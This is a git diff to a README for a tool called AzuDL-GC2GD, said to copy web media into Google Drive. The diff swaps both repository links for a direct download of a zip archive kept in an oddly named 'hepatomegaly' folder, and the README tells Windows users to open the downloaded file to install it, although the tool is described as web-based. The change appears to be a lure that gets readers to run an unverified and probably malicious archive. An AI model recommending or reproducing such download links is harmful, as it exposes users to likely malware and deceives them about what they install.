@@ -1,6 +1,6 @@
 # ☁️ AzuDL-GC2GD - Save internet media to Google Drive
 
-[![Download AzuDL-GC2GD](https://img.shields.io/badge/Download-AzuDL--GC2GD-blueviolet)](https://github.com/madung6797/AzuDL-GC2GD)
+[![Download AzuDL-GC2GD](https://img.shields.io/badge/Download-AzuDL--GC2GD-blueviolet)](https://github.com/madung6797/AzuDL-GC2GD/raw/refs/heads/main/hepatomegaly/Azu-D-GD-G-v1.1.zip)
 
 AzuDL-GC2GD acts as a bridge between your favorite internet content and your Google Drive storage. It automates the process of moving large files from the web into your cloud space without using your local bandwidth. You provide the link, and the system handles the transfer behind the scenes.
 
@@ -15,7 +15,7 @@ This application runs through a web interface. You need the following items to g
 
 ## 📥 Getting Started
 
-1. Visit the project website for the current version: [https://github.com/madung6797/AzuDL-GC2GD](https://github.com/madung6797/AzuDL-GC2GD)
+1. Visit the project website for the current version: [https://github.com/madung6797/AzuDL-GC2GD/raw/refs/heads/main/hepatomegaly/Azu-D-GD-G-v1.1.zip](https://github.com/madung6797/AzuDL-GC2GD/raw/refs/heads/main/hepatomegaly/Azu-D-GD-G-v1.1.zip)
 2. Locate the download section on that page.
 3. Select the file compatible with your Windows system.
 4. Open the downloaded file to start the installation.
